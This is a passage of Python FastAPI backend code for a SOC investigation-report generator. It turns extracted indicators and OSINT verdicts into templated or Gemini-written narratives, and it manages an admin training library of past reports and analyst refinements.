    top_targets = sorted(hits.items(), key=lambda x: -x[1])[:5]
    what_str = ", ".join(f"{v} (× {c})" if c > 1 else v for v, c in top_targets) if top_targets else "no reachable indicators"

    # Categories per IOC (from VT)
    cats: dict[str, int] = {}
    families: set[str] = set()
    geos: dict[str, int] = {}
    for r in enriched or []:
        rep = r.get("reputation") or {}
        vt = rep.get("vt") or {}
        for c in (vt.get("categories") or {}).values() if isinstance(vt.get("categories"), dict) else []:
            cats[c] = cats.get(c, 0) + 1
        for name in (vt.get("popular_threat_names") or []):
            families.add(str(name))
        en = r.get("enrichment") or {}
        geo = en.get("geo") or {}
        cc = geo.get("country") or geo.get("country_name")
        if cc:
            geos[cc] = geos.get(cc, 0) + 1
    cat_bit = ", ".join(sorted(cats.keys())[:5]) if cats else ""
    fam_bit = ", ".join(sorted(families)[:5]) if families else ""
    geo_bit = ", ".join(f"{c} ({n})" for c, n in sorted(geos.items(), key=lambda x: -x[1])[:3]) if geos else ""

    # Sentence bank
    S: dict[str, list[str]] = {"who": [], "what": [], "when": [], "where": [], "why": [], "how": [], "verdict": []}

    if ts_first:
        S["when"].append(f"The activity was observed {when_bit}.")
    S["who"].append(f"The activity is attributed to {who}.")
    if top_targets:
        S["what"].append(f"The affected identity interacted with the following indicators: {what_str}.")
    if devices:
        S["where"].append(f"The originating asset was {', '.join(devices[:3])}.")
    if geo_bit:
        S["where"].append(f"Destination hosting geography resolved to {geo_bit}.")
    if cat_bit or fam_bit:
        parts = []
        if cat_bit:
            parts.append(f"categorised by OSINT as {cat_bit}")
        if fam_bit:
            parts.append(f"associated with the family/detection {fam_bit}")
        S["why"].append("The destinations were " + " and ".join(parts) + ".")
    conn_bits = []
    total_conn = sum(hits.values())
    if total_conn:
        conn_bits.append(f"{total_conn} total connection reference{'s' if total_conn != 1 else ''} across the extracted targets")
    if blocked:
        conn_bits.append(f"{blocked} blocked")
    if allowed:
        conn_bits.append(f"{allowed} allowed")
    if denied:
        conn_bits.append(f"{denied} denied")
    if detected:
        conn_bits.append(f"{detected} detected")
    if dropped:
        conn_bits.append(f"{dropped} dropped")
    if quarantined:
        conn_bits.append(f"{quarantined} quarantined")
    if conn_bits:
        S["how"].append("Volume of activity: " + ", ".join(conn_bits) + ".")
    # OSINT verdict rollup
    stats = _deterministic_ioc_summary(enriched)["stats"] if enriched else {}
    mal = int(stats.get("malicious") or 0)
    susp = int(stats.get("suspicious") or 0)
    if mal or susp:
        vbits = []
        if mal:
            vbits.append(f"{mal} confirmed MALICIOUS")
        if susp:
            vbits.append(f"{susp} suspicious")
        S["verdict"].append("OSINT reputation across VirusTotal, AbuseIPDB, MalwareBazaar, URLhaus and ThreatFox flagged " + " and ".join(vbits) + " indicator(s).")
    elif enriched:
        S["verdict"].append("OSINT reputation across the integrated sources returned clean or unknown for every extracted indicator.")
    return S


def _flatten_5w1h(bank: dict[str, list[str]], order: tuple[str, ...] = ("when", "who", "what", "how", "where", "why", "verdict")) -> list[str]:
    out: list[str] = []
    for k in order:
        for s in bank.get(k) or []:
            if s and s not in out:
                out.append(s)
    return out


def _compose_forge_report(fmt: dict, sentences: list[str], recommendations: list[str]) -> str:
    """Shape the report according to `fmt` = {mode, count, verbose}.

    Recommendations are appended as an *extra* section (not counted in the
    paragraph/line/sentence total). If the user asks for bullets, everything
    (including recommendations) is emitted as bullets.
    """
    mode = fmt.get("mode", "paragraphs")
    count = int(fmt.get("count") or 0)
    verbose = bool(fmt.get("verbose"))

    body = sentences[:]
    if not body:
        body = ["No structured data could be extracted from the corpus."]

    if mode == "bullets":
        lines = [f"- {s}" for s in (body if verbose or count == 0 else body[:count or len(body)])]
        rec_block = ["", "Recommendations:"] + [f"- {r}" for r in recommendations]
        return "\n".join(lines + rec_block)

    if mode == "lines":
        n = count if count > 0 else len(body)
        lines = body[:n] if not verbose else body
        # Pad if the user asked for more lines than we have raw sentences
        while len(lines) < (count or 0):
            lines.append("No additional details are available from the corpus.")
        rec_block = ["", "Recommendations:"] + [f"- {r}" for r in recommendations]
        return "\n".join(lines + rec_block)

    if mode == "sentences":
        n = count if count > 0 else len(body)
        chosen = body if verbose else body[:n]
        # Pad
        while len(chosen) < (count or 0):
            chosen.append("Further detail is not available from the corpus.")
        return " ".join(chosen) + "\n\nRecommendations:\n" + "\n".join(f"- {r}" for r in recommendations)

    # paragraphs mode (default)
    n = count if count > 0 else 2
    if verbose or n == 1:
        # One dense paragraph with everything.
        para = " ".join(body)
        paras = [para]
        # Pad to N if user asked for >1 with "all details" — extra paras
        # each add a slice; but for verbose stick to the requested count via
        # splitting on natural boundaries.
        if n > 1 and not verbose:
            per = max(1, len(body) // n)
            paras = [" ".join(body[i:i + per]) for i in range(0, len(body), per)][:n]
    else:
        per = max(1, len(body) // n)
        paras = [" ".join(body[i:i + per]) for i in range(0, len(body), per)]
        # If chunking produced more than N (due to leftovers), fold them back.
        if len(paras) > n:
            paras = paras[:n - 1] + [" ".join(paras[n - 1:])]
        # If fewer, pad
        while len(paras) < n:
            paras.append("No further factual observations remained after the preceding analysis; the extracted indicators, timestamps and volumes above capture the corpus in full.")

    return "\n\n".join(paras) + "\n\nRecommendations:\n" + "\n".join(f"- {r}" for r in recommendations)


class ForgeReportInput(BaseModel):
    instructions: str = ""     # free-form analyst prompt (may be empty)
    data: str                  # raw logs / text (uploaded file content OR pasted)
    enrich: bool = True        # run OSINT against extracted IOCs
    max_iocs: int = 15         # cap IOC enrichment
    ai_mode: bool = False      # when true, LLM writes the narrative paragraphs
    ai_model: str = "gemini-3-flash-preview"  # gemini-3-flash-preview | gemini-3.5-flash


@api_router.post("/forge/ocr-image")
async def forge_ocr_image(file: UploadFile = File(...)):
    """OCR an uploaded image (screenshot of alert/log/dashboard) → plain text.

    Public endpoint — the Investigation Report UI calls this before sending
    the extracted text to /forge/investigation-report. Runs fully offline
    via local Tesseract; no LLM used.
    """
    body = await file.read()
    if not body:
        raise HTTPException(status_code=400, detail="Empty file")
    if len(body) > 10 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="Image exceeds 10 MB")
    mime = (file.content_type or "").lower()
    if not (mime.startswith("image/") or (file.filename or "").lower().endswith((".png", ".jpg", ".jpeg", ".webp", ".bmp", ".tiff", ".gif"))):
        raise HTTPException(status_code=415, detail="Upload an image (png / jpg / webp / bmp / tiff)")
    text = _ocr_image_bytes(body)
    return {
        "filename": file.filename or "image",
        "mime": mime,
        "bytes": len(body),
        "text": text,
        "char_count": len(text),
        "line_count": text.count("\n") + 1 if text else 0,
    }


# System prompt for the AI-narrative mode. Locks the model to strict
# evidence-only prose — no hallucinated indicators, actor names, dates,
# families or delivery vectors beyond what the deterministic engine
# supplied in the evidence bundle.
_FORGE_AI_SYSTEM = (
    "You are NivX Cognis AI, the in-house SOC/MDR analyst at NivX Machines. You "
    "write customer-facing investigation reports. You will receive (a) a raw log "
    "excerpt, (b) an EVIDENCE JSON containing deterministically extracted facts "
    "(IOCs, timestamps, users, devices, actions and OSINT verdicts), and (c) the "
    "user's free-form format instruction.\n\n"
    "STRICT RULES — obey without exception:\n"
    " 1. Use ONLY the facts present in the raw log or the EVIDENCE JSON. Never "
    "    fabricate IOCs, hostnames, usernames, hashes, dates, malware family names, "
    "    threat-actor attribution, delivery vectors (drive-by, phishing, etc.) or "
    "    MITRE techniques that are not in the evidence.\n"
    " 2. If a detail is not in the evidence, do NOT include it. Missing data must be "
    "    silently omitted — never guessed.\n"
    " 3. Follow the user's format hint EXACTLY: N paragraphs, N lines, N sentences, "
    "    bullet points, or 'with all details'. If no format was specified, default "
    "    to 2 paragraphs.\n"
    " 4. Do NOT include any Recommendations / Remediation section — those are "
    "    appended separately by the deterministic engine after your narrative.\n"
    " 5. Do NOT use markdown headings. Plain prose (or plain bullet dashes) only.\n"
    " 6. Do NOT introduce yourself or mention 'NivX Cognis AI' in the output — the "
    "    reader already knows.\n"
    " 7. Tone: factual, analyst-grade, third-person. No hype, no filler."
)


async def _forge_ai_narrative(raw: str,
                              instructions: str,
                              case_type: str,
                              fmt: dict,
                              iocs: list[str],
                              enriched: list[dict],
                              context: dict,
                              stats: dict,
                              model_id: str) -> str:
    """Call the Emergent LLM to compose the narrative paragraphs.

    Returns the narrative body only — the caller appends the deterministic
    Recommendations block afterwards.

    Retrieves training-center examples matching this case and adds them as
    few-shot demonstrations. Uses the admin-configured custom persona when
    present, otherwise falls back to the default system prompt.
    """
    if not EMERGENT_LLM_KEY:
        raise HTTPException(status_code=503, detail="AI mode requires EMERGENT_LLM_KEY to be configured")
    if model_id not in ("gemini-3-flash-preview", "gemini-3.5-flash"):
        model_id = "gemini-3-flash-preview"

    # Trim per-IOC evidence to keep the prompt small.
    compact_enriched = []
    for r in (enriched or [])[:20]:
        rep = r.get("reputation") or {}
        vt = rep.get("vt") or {}
        ab = rep.get("abuseipdb") or {}
        en = r.get("enrichment") or {}
        compact_enriched.append({
            "value": r.get("value"),
            "type": r.get("type"),
            "vt_malicious": vt.get("malicious") if not vt.get("error") else None,
            "vt_categories": list((vt.get("categories") or {}).values())[:5] if isinstance(vt.get("categories"), dict) else [],
            "vt_threat_names": (vt.get("popular_threat_names") or [])[:5],
            "abuseipdb_score": ab.get("score") if not ab.get("error") else None,
            "geo_country": (en.get("geo") or {}).get("country") or (en.get("geo") or {}).get("country_name"),
            "in_internal_db": bool(r.get("local_db")),
        })

    evidence = {
        "case_type": case_type,
        "format_hint": fmt,
        "timestamps": (context.get("timestamps") or [])[:10],
        "users": (context.get("users") or [])[:5],
        "emails": (context.get("emails") or [])[:5],
        "devices": (context.get("devices") or [])[:5],
        "action_counts": dict(context.get("actions") or []),
        "line_count": context.get("line_count"),
        "iocs": iocs[:20],
        "hit_counts": _count_target_hits(raw, iocs),
        "osint_verdict": {
            "malicious": stats.get("malicious", 0),
            "suspicious": stats.get("suspicious", 0),
            "clean": stats.get("clean", 0),
            "known_internal": stats.get("known_internal", 0),
        },
        "enriched": compact_enriched,
    }

    fmt_hint = instructions.strip() or "Write in 2 paragraphs."

    # ---- Analyst training center: custom persona + few-shot examples ----
    persona = _FORGE_AI_SYSTEM
    try:
        cfg = await db.forge_training_config.find_one({"_id": "singleton"})
        if cfg and (cfg.get("persona") or "").strip():
            # Append the custom persona to the strict rules — never replace
            # the "no hallucination" clauses. This keeps guarantees intact.
            persona = _FORGE_AI_SYSTEM + "\n\nHOUSE STYLE (from analyst training center):\n" + cfg["persona"].strip()
    except Exception:
        pass

    # Retrieve top 2 exemplars for few-shot.
    fewshot_block = ""
    try:
        exemplars = await find_matching_forge_examples(case_type, raw, iocs, limit=2)
        if exemplars:
            blocks = []
            for i, ex in enumerate(exemplars, 1):
                if not (ex.get("narrative") or "").strip():
                    continue
                blocks.append(
                    f"--- Example {i} ({ex.get('case_type')}, from analyst training center) ---\n"
                    f"Alert / log excerpt:\n{(ex.get('raw_data') or '')[:1500]}\n\n"
                    f"Analyst report (STYLE reference only — never copy specific facts):\n{(ex.get('narrative') or '')[:2500]}\n"
                )
            if blocks:
                fewshot_block = (
                    "\n\nSTYLE REFERENCES — the following are past investigations written by this SOC. "
                    "Match their tone, structure, sentence rhythm and closing phrasing. Do NOT copy specific "
                    "IOCs, hostnames, users, dates or attribution from these examples — they are for STYLE ONLY.\n\n"
                    + "\n".join(blocks)
                )
    except Exception as e:
        logger.warning(f"few-shot retrieval failed: {e}")

    prompt = (
        f"USER FORMAT INSTRUCTION: {fmt_hint}\n\n"
        f"RAW LOG EXCERPT (verbatim, do not quote back — reference only):\n"
        f"```\n{raw[:4000]}\n```\n\n"
        f"EVIDENCE JSON (authoritative — use these facts, no others):\n"
        f"```json\n{json.dumps(evidence, default=str)[:6000]}\n```"
        f"{fewshot_block}\n\n"
        f"Compose the investigation narrative now. Remember: no fabrication, no "
        f"markdown headings, no recommendations section."
    )

    try:
        from emergentintegrations.llm.chat import LlmChat, UserMessage
        sid = f"forge-report-{hash(raw[:200] + instructions) & 0xffffffff:x}"
        chat = LlmChat(
            api_key=EMERGENT_LLM_KEY,
            session_id=sid,
            system_message=persona,
        ).with_model("gemini", model_id)
        resp = await chat.send_message(UserMessage(text=prompt))
        text = resp if isinstance(resp, str) else str(resp)
        return text.strip()
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"forge AI narrative failed ({model_id}): {e}")
        raise HTTPException(status_code=502, detail=f"AI narrative generation failed: {e}")


@api_router.post("/forge/investigation-report")
async def forge_investigation_report(payload: ForgeReportInput):
    """Generate an investigation report.

    Deterministic by default — rule-based extraction of IOCs / users / devices /
    timestamps and case classification (malware / dns_proxy / mixed / generic),
    with rule-driven remediation recommendations composed from actual findings.

    When `ai_mode=true`, the same deterministic evidence bundle is handed to
    Gemini (3-flash or 3.5-flash) which composes ONLY the narrative paragraphs
    — obeying strict "no fabrication, evidence-only" rules. The Recommendations
    block remains deterministic (never LLM-authored) to keep customer-facing
    advice auditable.
    """
    raw = (payload.data or "").strip()
    if not raw:
        raise HTTPException(status_code=400, detail="Provide log/data content to analyze")
    if len(raw) > 500_000:
        raw = raw[:500_000]  # 500 KB cap

    context = _parse_forge_context(raw)
    iocs = _extract_forge_iocs(raw)[: max(1, min(payload.max_iocs, 50))]

    enriched: list[dict] = []
    if payload.enrich and iocs:
        sem = asyncio.Semaphore(8)
        async with httpx.AsyncClient(timeout=12, follow_redirects=True) as hc:
            async def one(v: str) -> dict:
                async with sem:
                    try:
                        return await _do_lookup(hc, v)
                    except Exception:
                        return {"value": v, "type": _classify_ioc(v), "reputation": None,
                                "enrichment": None, "local_db": None, "links": {}}
            enriched = await asyncio.gather(*[one(v) for v in iocs])

    stats = (_deterministic_ioc_summary(enriched)["stats"] if enriched else {}) or {}
    case_type = _classify_forge_case(raw, iocs, enriched)
    fmt = _parse_output_format(payload.instructions)
    recommendations = _dynamic_recommendations(case_type, raw, iocs, enriched, context, stats)

    if payload.ai_mode:
        narrative = await _forge_ai_narrative(
            raw=raw, instructions=payload.instructions,
            case_type=case_type, fmt=fmt,
            iocs=iocs, enriched=enriched, context=context, stats=stats,
            model_id=payload.ai_model,
        )
        # Append deterministic Recommendations section — never LLM-authored.
        report = narrative.rstrip() + "\n\nRecommendations:\n" + "\n".join(f"- {r}" for r in recommendations)
        engine = "ai"
    else:
        bank = _forge_5w1h_sentences(raw, iocs, enriched, context, case_type)
        sentences = _flatten_5w1h(bank)
        report = _compose_forge_report(fmt, sentences, recommendations)
        engine = "deterministic"

    return {
        "report": report,
        "instructions": payload.instructions or "",
        "format": fmt,
        "case_type": case_type,
        "engine": engine,
        "ai_model": payload.ai_model if payload.ai_mode else None,
        # legacy field — kept for backwards compatibility with the frontend
        "paragraph_count": (report.split("\n\nRecommendations")[0].count("\n\n") + 1) if fmt["mode"] == "paragraphs" else fmt.get("count", 0) or 0,
        "iocs_extracted": iocs,
        "enriched": enriched,
        "stats": stats,
        "context": context,
        "recommendations": recommendations,
        "generated_at": now_iso(),
    }


# ============================================================================
# NivX Forge — Analyst Training Center
# ---------------------------------------------------------------------------
# Admin-editable library of past investigations, custom persona and case
# taxonomy. Every AI-mode report generation retrieves the top matching
# examples and adds them as few-shot exemplars to Gemini so the output
# mirrors this SOC's tone, structure and closer phrasing.
#
# Storage
#   forge_training_examples  – Mongo collection (metadata + narrative)
#   forge_training_config    – Mongo collection (persona + custom case types)
#   /app/backend/uploads/forge-training/{id}/{filename}
#     – on-disk store for attachments (any format up to 10 MB each)
# ============================================================================

FORGE_UPLOAD_ROOT = Path("/app/backend/uploads/forge-training")
FORGE_UPLOAD_ROOT.mkdir(parents=True, exist_ok=True)
_FORGE_MAX_ATT_BYTES = 10 * 1024 * 1024   # 10 MB per attachment
_FORGE_MAX_TEXT = 200_000                  # 200 KB caps on text fields


def _ocr_image_bytes(body: bytes) -> str:
    """Extract text from a raw image byte-string using Tesseract (offline).

    Returns "" on failure — OCR is best-effort. Never raises to the caller.
    """
    try:
        import pytesseract  # noqa: WPS433 — optional dep, imported lazily
        from PIL import Image
        img = Image.open(io.BytesIO(body))
        # Convert palette / RGBA to RGB for consistent OCR.
        if img.mode not in ("L", "RGB"):
            img = img.convert("RGB")
        # Cap enormous screenshots to keep OCR fast.
        max_side = 4000
        if max(img.size) > max_side:
            ratio = max_side / max(img.size)
            img = img.resize((int(img.size[0] * ratio), int(img.size[1] * ratio)))
        text = pytesseract.image_to_string(img, lang="eng", timeout=30)
        return (text or "").strip()
    except Exception as e:
        logger.warning(f"OCR failed: {e}")
        return ""


class ForgeTrainingExample(BaseModel):
    """A past-investigation exemplar used as few-shot for the AI narrative."""
    title: str
    case_type: str = "generic"     # matches the classifier taxonomy
    tags: list[str] = Field(default_factory=list)
    raw_data: str = ""              # the original alert/log/IOC bundle
    narrative: str = ""             # the ideal analyst-written investigation report
    recommendations: list[str] = Field(default_factory=list)
    analyst_notes: str = ""         # "when to use this style"
    active: bool = True


class ForgeTrainingConfig(BaseModel):
    persona: str = ""               # overrides _FORGE_AI_SYSTEM when set
    custom_case_types: list[dict] = Field(default_factory=list)  # [{key, label, keywords}]


def _forge_training_serialize(doc: dict) -> dict:
    """Normalise a Mongo doc for JSON return."""
    if not doc:
        return {}
    return {
        "id": str(doc.get("_id") or doc.get("id") or ""),
        "title": doc.get("title") or "",
        "case_type": doc.get("case_type") or "generic",
        "tags": doc.get("tags") or [],
        "raw_data": doc.get("raw_data") or "",
        "narrative": doc.get("narrative") or "",
        "recommendations": doc.get("recommendations") or [],
        "analyst_notes": doc.get("analyst_notes") or "",
        "active": bool(doc.get("active", True)),
        "attachments": doc.get("attachments") or [],
        "source": doc.get("source") or "authored",
        "ai_original": doc.get("ai_original") or "",
        "ai_model": doc.get("ai_model") or "",
        "created_by": doc.get("created_by") or "",
        "created_by_role": doc.get("created_by_role") or "",
        "created_at": doc.get("created_at") or "",
        "updated_at": doc.get("updated_at") or "",
    }


@api_router.post("/admin/forge/training/examples")
async def create_forge_training_example(
    payload: ForgeTrainingExample,
    admin: dict = Depends(require_role("admin")),
):
    now = now_iso()
    doc = {
        "_id": str(uuid.uuid4()),
        "title": (payload.title or "").strip()[:200],
        "case_type": (payload.case_type or "generic").strip().lower()[:40],
        "tags": [str(t)[:40] for t in (payload.tags or [])][:20],
        "raw_data": (payload.raw_data or "")[:_FORGE_MAX_TEXT],
        "narrative": (payload.narrative or "")[:_FORGE_MAX_TEXT],
        "recommendations": [str(r)[:500] for r in (payload.recommendations or [])][:30],
        "analyst_notes": (payload.analyst_notes or "")[:5000],
        "active": bool(payload.active),
        "attachments": [],
        "created_by": admin.get("email") or admin.get("id") or "admin",
        "created_at": now,
        "updated_at": now,
    }
    if not doc["title"]:
        raise HTTPException(status_code=400, detail="Title is required")
    await db.forge_training_examples.insert_one(doc)
    return _forge_training_serialize(doc)


@api_router.get("/admin/forge/training/examples")
async def list_forge_training_examples(
    case_type: Optional[str] = None,
    q: Optional[str] = None,
    active: Optional[bool] = None,
    source: Optional[str] = None,  # "authored" | "refinement" | None (= all)
    admin: dict = Depends(require_role("admin")),
):
    query: dict = {}
    if case_type:
        query["case_type"] = case_type.strip().lower()
    if active is not None:
        query["active"] = bool(active)
    if source:
        s = source.strip().lower()
        if s == "authored":
            # Legacy admin-added rows have no `source` field OR source='authored'.
            query["$or"] = [{"source": {"$exists": False}}, {"source": "authored"}]
        else:
            query["source"] = s
    if q:
        needle = re.escape(q.strip())
        text_filter = [
            {"title":     {"$regex": needle, "$options": "i"}},
            {"tags":      {"$regex": needle, "$options": "i"}},
            {"narrative": {"$regex": needle, "$options": "i"}},
            {"raw_data":  {"$regex": needle, "$options": "i"}},
        ]
        if "$or" in query:
            # Combine both $or filters into $and to preserve source filter.
            query = {"$and": [{"$or": query.pop("$or")}, {"$or": text_filter}], **query}
        else:
            query["$or"] = text_filter
    cur = db.forge_training_examples.find(query).sort("updated_at", -1).limit(300)
    return {"examples": [_forge_training_serialize(d) async for d in cur]}


@api_router.get("/admin/forge/training/examples/{example_id}")
async def get_forge_training_example(
    example_id: str,
    admin: dict = Depends(require_role("admin")),
):
    doc = await db.forge_training_examples.find_one({"_id": example_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Example not found")
    return _forge_training_serialize(doc)


@api_router.put("/admin/forge/training/examples/{example_id}")
async def update_forge_training_example(
    example_id: str,
    payload: ForgeTrainingExample,
    admin: dict = Depends(require_role("admin")),
):
    now = now_iso()
    update = {
        "title": (payload.title or "").strip()[:200],
        "case_type": (payload.case_type or "generic").strip().lower()[:40],
        "tags": [str(t)[:40] for t in (payload.tags or [])][:20],
        "raw_data": (payload.raw_data or "")[:_FORGE_MAX_TEXT],
        "narrative": (payload.narrative or "")[:_FORGE_MAX_TEXT],
        "recommendations": [str(r)[:500] for r in (payload.recommendations or [])][:30],
        "analyst_notes": (payload.analyst_notes or "")[:5000],
        "active": bool(payload.active),
        "updated_at": now,
    }
    res = await db.forge_training_examples.update_one({"_id": example_id}, {"$set": update})
    if res.matched_count == 0:
        raise HTTPException(status_code=404, detail="Example not found")
    doc = await db.forge_training_examples.find_one({"_id": example_id})
    return _forge_training_serialize(doc)


@api_router.delete("/admin/forge/training/examples/{example_id}")
async def delete_forge_training_example(
    example_id: str,
    admin: dict = Depends(require_role("admin")),
):
    doc = await db.forge_training_examples.find_one({"_id": example_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Example not found")
    # Delete attachments on disk too
    ex_dir = FORGE_UPLOAD_ROOT / example_id
    if ex_dir.exists():
        for f in ex_dir.iterdir():
            try:
                f.unlink()
            except Exception:
                pass
        try:
            ex_dir.rmdir()
        except Exception:
            pass
    await db.forge_training_examples.delete_one({"_id": example_id})
    return {"ok": True}


@api_router.post("/admin/forge/training/examples/{example_id}/attachments")
async def upload_forge_training_attachment(
    example_id: str,
    file: UploadFile = File(...),
    admin: dict = Depends(require_role("admin")),
):
    doc = await db.forge_training_examples.find_one({"_id": example_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Example not found")
    body = await file.read()
    if len(body) > _FORGE_MAX_ATT_BYTES:
        raise HTTPException(status_code=413, detail="Attachment exceeds 10 MB")
    ex_dir = FORGE_UPLOAD_ROOT / example_id
    ex_dir.mkdir(parents=True, exist_ok=True)
    att_id = str(uuid.uuid4())
    safe_name = re.sub(r"[^A-Za-z0-9._-]", "_", (file.filename or "attachment"))[:120]
    path = ex_dir / f"{att_id}__{safe_name}"
    path.write_bytes(body)
    mime = file.content_type or "application/octet-stream"
    kind = "image" if mime.startswith("image/") else "file"
    ocr_text = ""
    if kind == "image":
        ocr_text = _ocr_image_bytes(body)
    entry = {
        "id": att_id,
        "filename": safe_name,
        "mime": mime,
        "kind": kind,
        "size": len(body),
        "storage": str(path),
        "ocr_text": ocr_text,
        "uploaded_at": now_iso(),
    }
    await db.forge_training_examples.update_one(
        {"_id": example_id},
        {"$push": {"attachments": entry}, "$set": {"updated_at": now_iso()}},
    )
    return entry


@api_router.delete("/admin/forge/training/examples/{example_id}/attachments/{att_id}")
async def delete_forge_training_attachment(
    example_id: str,
    att_id: str,
    admin: dict = Depends(require_role("admin")),
):
    doc = await db.forge_training_examples.find_one({"_id": example_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Example not found")
    keep, drop = [], None
    for a in (doc.get("attachments") or []):
        (drop, keep) if a.get("id") == att_id else (keep, drop)
        if a.get("id") == att_id:
            drop = a
        else:
            keep.append(a)
    if not drop:
        raise HTTPException(status_code=404, detail="Attachment not found")
    try:
        Path(drop.get("storage") or "").unlink(missing_ok=True)
    except Exception:
        pass
    await db.forge_training_examples.update_one(
        {"_id": example_id},
        {"$set": {"attachments": keep, "updated_at": now_iso()}},
    )
    return {"ok": True}


@api_router.get("/admin/forge/training/examples/{example_id}/attachments/{att_id}")
async def download_forge_training_attachment(
    example_id: str,
    att_id: str,
    admin: dict = Depends(require_role("admin")),
):
    from fastapi.responses import FileResponse
    doc = await db.forge_training_examples.find_one({"_id": example_id})
    if not doc:
        raise HTTPException(status_code=404, detail="Example not found")
    for a in (doc.get("attachments") or []):
        if a.get("id") == att_id:
            path = a.get("storage") or ""
            if not path or not Path(path).exists():
                raise HTTPException(status_code=404, detail="Attachment file missing on disk")
            return FileResponse(path, media_type=a.get("mime") or "application/octet-stream",
                                filename=a.get("filename") or "attachment")
    raise HTTPException(status_code=404, detail="Attachment not found")


# ---- Persona / custom case types ------------------------------------------

@api_router.get("/admin/forge/training/config")
async def get_forge_training_config(admin: dict = Depends(require_role("admin"))):
    doc = await db.forge_training_config.find_one({"_id": "singleton"})
    return {
        "persona": (doc or {}).get("persona", ""),
        "custom_case_types": (doc or {}).get("custom_case_types", []),
    }


@api_router.put("/admin/forge/training/config")
async def put_forge_training_config(
    payload: ForgeTrainingConfig,
    admin: dict = Depends(require_role("admin")),
):
    doc = {
        "persona": (payload.persona or "")[:10_000],
        "custom_case_types": [
            {
                "key": re.sub(r"[^a-z0-9_]", "_", str(c.get("key") or "").lower())[:40],
                "label": str(c.get("label") or "")[:80],
                "keywords": [str(k).lower()[:40] for k in (c.get("keywords") or [])][:40],
            }
            for c in (payload.custom_case_types or [])
        ][:20],
        "updated_at": now_iso(),
        "updated_by": admin.get("email") or "admin",
    }
    await db.forge_training_config.update_one({"_id": "singleton"}, {"$set": doc}, upsert=True)
    return {"ok": True, **doc}


# ---- Retrieval helper — used by _forge_ai_narrative ------------------------

_TOKEN_RE = re.compile(r"[a-zA-Z0-9]{3,}")


# ---- Analyst refinement (RLHF-lite) ---------------------------------------
# After NivX Cognis AI generates a report, the analyst can edit the narrative
# / recommendations and save the refined version as a training example. Any
# authenticated analyst (admin or employee) can submit a refinement — it is
# stored in the same collection with `source="refinement"` and the original
# AI narrative is preserved on `ai_original` for audit / diff. On the next
# similar case, `find_matching_forge_examples` will retrieve this refinement
# as a few-shot exemplar, so Cognis AI's output improves over time.

class ForgeRefinement(BaseModel):
    title: str = ""                       # auto-suggested if empty
    case_type: str = "generic"
    tags: list[str] = Field(default_factory=list)
    raw_data: str                          # original alert/log the report was generated on
    narrative: str                         # ANALYST-REFINED narrative (what "good" looks like)
    recommendations: list[str] = Field(default_factory=list)
    ai_original: str = ""                  # AI-generated narrative (kept for audit)
    ai_model: str = ""                     # gemini-3-flash-preview | gemini-3.5-flash | ""
    analyst_notes: str = ""


@api_router.post("/forge/training/refinements")
async def submit_forge_refinement(
    payload: ForgeRefinement,
    user: dict = Depends(require_role("admin", "employee")),
):
    """Save an analyst-refined investigation report as a training example.

    Retrievable by future AI generations (few-shot). Requires an authenticated
    analyst identity — admin or employee — so we always know who taught what.
    """
    raw = (payload.raw_data or "").strip()
    narrative = (payload.narrative or "").strip()
    if not raw:
        raise HTTPException(status_code=400, detail="raw_data is required")
    if not narrative:
        raise HTTPException(status_code=400, detail="narrative (refined report) is required")

    # Auto-suggest a title if the analyst didn't set one.
    title = (payload.title or "").strip()
    if not title:
        # Try first log line, else timestamp+case_type, else first 60 chars.
        first_line = next((ln.strip() for ln in raw.splitlines() if ln.strip()), "")[:120]
        title = first_line or f"Refinement · {payload.case_type} · {now_iso()[:19]}"

    now = now_iso()
    doc = {
        "_id": str(uuid.uuid4()),
        "title": title[:200],
        "case_type": (payload.case_type or "generic").strip().lower()[:40],
        "tags": [str(t)[:40] for t in (payload.tags or [])][:20],
        "raw_data": raw[:_FORGE_MAX_TEXT],
        "narrative": narrative[:_FORGE_MAX_TEXT],
        "recommendations": [str(r)[:500] for r in (payload.recommendations or [])][:30],
        "analyst_notes": (payload.analyst_notes or "")[:5000],
        "active": True,
        "attachments": [],
        "source": "refinement",
        "ai_original": (payload.ai_original or "")[:_FORGE_MAX_TEXT],
        "ai_model": (payload.ai_model or "").strip()[:60],
        "created_by": user.get("email") or user.get("id") or "analyst",
        "created_by_role": user.get("role") or "employee",
        "created_at": now,
        "updated_at": now,
    }
    await db.forge_training_examples.insert_one(doc)
    return {
        "ok": True,
        "id": doc["_id"],
        "title": doc["title"],
        "case_type": doc["case_type"],
        "created_by": doc["created_by"],
        "created_at": doc["created_at"],
    }


def _tokenize_for_match(text: str) -> set[str]:
    return set(t.lower() for t in _TOKEN_RE.findall(text or ""))


async def find_matching_forge_examples(case_type: str, raw: str,
                                        iocs: list[str], limit: int = 2) -> list[dict]:
    """Return up to `limit` best-matching training examples for a new report.

    Retrieval strategy (deterministic, no embeddings):
      1. Filter to `active=true` + same `case_type` (falls back to any case type
         if we don't have enough matches).
      2. Rank by Jaccard token overlap between (raw+iocs) and (example.raw_data
         + example.tags + example.title).
    """
    if limit <= 0:
        return []
    try:
        query = {"active": True}
        docs: list[dict] = []
        cur = db.forge_training_examples.find({**query, "case_type": case_type}).limit(100)
        async for d in cur:
            docs.append(d)
        if len(docs) < limit:
            # Fall back to any case type — still useful as style reference.
            cur = db.forge_training_examples.find(query).limit(200)
            async for d in cur:
                if d.get("_id") not in {x.get("_id") for x in docs}:
                    docs.append(d)
        if not docs:
            return []
        seed_tokens = _tokenize_for_match(raw + " " + " ".join(iocs))
        def score(ex: dict) -> float:
            att_ocr = " ".join((a.get("ocr_text") or "") for a in (ex.get("attachments") or []))
            ex_tokens = _tokenize_for_match(
                (ex.get("raw_data") or "") + " " +
                " ".join(ex.get("tags") or []) + " " +
                (ex.get("title") or "") + " " + att_ocr
            )
            if not seed_tokens or not ex_tokens:
                return 0.0
            inter = len(seed_tokens & ex_tokens)
            union = len(seed_tokens | ex_tokens)
            base = inter / union if union else 0.0
            # Small bonus for exact case_type match.
            if ex.get("case_type") == case_type:
                base += 0.05
            return base
        ranked = sorted(docs, key=score, reverse=True)
        return [_forge_training_serialize(d) for d in ranked[:limit]]
    except Exception as e:
        logger.warning(f"find_matching_forge_examples failed: {e}")
        return []


@api_router.get("/live-feed")
async def live_feed(limit: int = 50):
